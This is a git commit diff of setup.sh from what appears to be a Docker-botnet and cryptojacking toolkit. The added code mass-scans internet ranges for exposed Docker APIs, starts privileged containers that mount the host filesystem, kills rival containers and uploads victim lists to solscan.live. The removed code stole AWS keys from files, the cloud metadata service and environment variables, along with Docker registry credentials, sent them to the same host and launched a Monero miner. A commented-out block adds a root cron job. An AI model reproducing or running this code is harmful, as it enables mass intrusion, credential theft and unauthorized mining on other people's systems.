e0b8864e3d071312f27a38bd267d698c05557333
ToRxmrig <79212597+ToRxmrig@users.noreply.github.com>
2024-09-10 18:45:33 -0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -3,89 +3,58 @@ unset HISTFILE
 export LC_ALL=C
 export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
 
-function INIT_MAIN(){
-SETUP_BASICS
-SETUP_JQ
-GABBING_DATA
-SETUP_XMR
-START_XMR
-SETUP_MSCAN
-SETUP_ZMAP
-bash /root/scan.sh
+function DOCKERGEDDON(){
+THERANGE=$1
+PORT=$2
+SCANRATE=$3
+PWNCONTI=$4
+rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
+eval "$rndstr"="'$(masscan $THERANGE -p$PORT --rate=$SCANRATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
+
+for IPADDY in ${!rndstr}
+do
+echo "$IPADDY:$PORT"
+echo "$IPADDY:$PORT" >> /tmp/out.txt
+timeout -s SIGKILL 30 docker -H $IPADDY:$PORT info  >> /tmp/check.txt 2>/dev/null
+HE_SAY=$?
+echo $HE_SAY
+if [ "$HE_SAY" = "0" ]; then
+DONTINF="no"
+RAM=$(cat /tmp/check.txt | grep "Total Memory" | awk '{print $3}')
+ARCHITEC=$(cat /tmp/check.txt | grep Architecture | awk '{print $2}')
+if [ "$RAM" = "31.42GiB" ]; then DONTINF="yes" ; echo -e "\e[1;33;41m Ein freundliches FU!!! \033[0m"; fi
+if [ "$ARCHITEC" != "x86_64" ] ; then DONTINF="yes" ; echo -e "\e[1;33;41m Noch nicht unsere Plattform!!! \033[0m"; fi
+if [ "$DONTINF" = "no" ]; then
+timeout -s SIGKILL 120 docker -H $IPADDY:$PORT run -d --name smallV2 --privileged --net host -v /:/host $PWNCONTI
+HE_SAY=$?
+echo $HE_SAY
+if [ "$HE_SAY" = "0" ]; then
+OLDCONTI=`docker -H $IPADDY:$PORT ps | grep -v "smallV2" | grep "small" | awk '{print $1}'`
+if ! [ -z "$OLDCONTI" ] ; then docker -H $IPADDY:$PORT stop $OLDCONTI ; fi
+fi
+
+fi ; fi
+rm -f /tmp/check.txt
+done;
 }
 
-function SETUP_BASICS(){
-apk update
-apk add bash curl cmake make wget vim docker
-curl -v -s http://dl-cdn.alpinelinux.org/alpine/edge/main/x86_64/APKINDEX.tar.gz > /dev/null
-service docker start
-}
-
-function SETUP_JQ(){
-apk update
-apk add jq
-}
-
-function SETUP_MSCAN(){
-apk update
-apk add git gcc make musl-dev libpcap-dev linux-headers
-git clone https://github.com/robertdavidgraham/masscan /opt/masscan/
-cd /opt/masscan/
-make
-make install
-}
-
-function SETUP_ZMAP(){
-apk update
-apk add zmap
-# Download and install zgrab and jq
-for file in zgrab jq; do
-    if ! [ -f "/usr/sbin/$file" ]; then
-            curl -sLk -o /usr/sbin/$file "https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/$file"
-            chmod +x /usr/sbin/$file
-    fi
+while true
+do
+CONTAINER=$(curl -s http://solscan.live/SFRAME/data/cont_docker.dat)
+if [ -z "$CONTAINER" ] ; then CONTAINER="nmlmweb3/smol" ; fi
+SRATE=$(curl -s http://solscan.live/SFRAME/range/d_rate.txt)
+if [ -z "$SRATE" ] ; then SRATE="100000" ; fi
+RANGE=$(curl -s http://solscan.live/SFRAME/range/d.php)
+RANGETOSCAN=$RANGE".0.0.0/8"
+if [ -z "$RANGETOSCAN" ] ; then RANGETOSCAN=$(($RANDOM%255+1)).0.0.0/8 ; fi
+DOCKERGEDDON $RANGETOSCAN 2375 $SRATE $CONTAINER
+if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
+DOCKERGEDDON $RANGETOSCAN 2376 $SRATE $CONTAINER
+if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
+DOCKERGEDDON $RANGETOSCAN 2377 $SRATE $CONTAINER
+if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
+DOCKERGEDDON $RANGETOSCAN 4244 $SRATE $CONTAINER
+if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
+DOCKERGEDDON $RANGETOSCAN 4243 $SRATE $CONTAINER
+if [ -f "/tmp/out.txt" ] ; then curl -F "userfile=@/tmp/out.txt" http://solscan.live/SFRAME/results/d.php ; rm -f /tmp/out.txt ; fi
 done
-}
-
-function GABBING_DATA(){
-if [ -d "/host" ] ; then
-cat /host/root/.aws/* >> /tmp/.aws 2>/dev/null ; cat /host/home/*/.aws/* >> /tmp/.aws 2>/dev/null
-cat /tmp/.aws | grep "aws_access_key_id" || rm -f /tmp/.aws
-if [ -f "/tmp/.aws" ] ; then curl -F "userfile=@/tmp/.aws" http://solscan.live/upload.php ; rm -f /tmp/.aws ; fi
-
-curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) >> /tmp/.aws2
-cat /tmp/.aws2 | grep "SecretAccessKey" || rm -f /tmp/.aws2 
-if [ -f "/tmp/.aws2" ] ; then curl -F "userfile=@/tmp/.aws2" http://solscan.live/upload.php  ; rm -f /tmp/.aws2 ; fi
-
-env | grep "AWS" >> /tmp/.aws3
-cat /tmp/.aws2 | grep "AWS" || rm -f /tmp/.aws3
-if [ -f "/tmp/.aws3" ] ; then curl -F "userfile=@/tmp/.aws3" http://solscan.live/upload.php  ; rm -f /tmp/.aws3 ; fi
-
-
-cat /host/root/.docker/config.json >> /tmp/.docker 2>/dev/null ; cat /host/home/*/.docker/config.json >> /tmp/.docker 2>/dev/null
-cat /tmp/.docker | grep "auth" || rm -f /tmp/.docker
-if [ -f "/tmp/.docker" ] ; then
-curl -F "userfile=@/tmp/.docker" http://solscan.live/upload.php 
-rm -f /tmp/.docker
-fi
-
-fi
-}
-
-function SETUP_XMR(){
-bash /root/x.sh
-}
-
-#chattr -ia /host/ /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/root
-#chmod 1777 /host/var/spool/cron/root
-#rm -f /host/var/spool/cron/root
-#echo '*/1 * * * * /usr/bin/Daemon 2>/dev/null 1>/dev/null ; crontab -r' > /host/var/spool/cron/root
-#}
-
-function START_XMR(){
-chmod +x /root/sbin
-/root/sbin &
-}
-
-
-INIT_MAIN
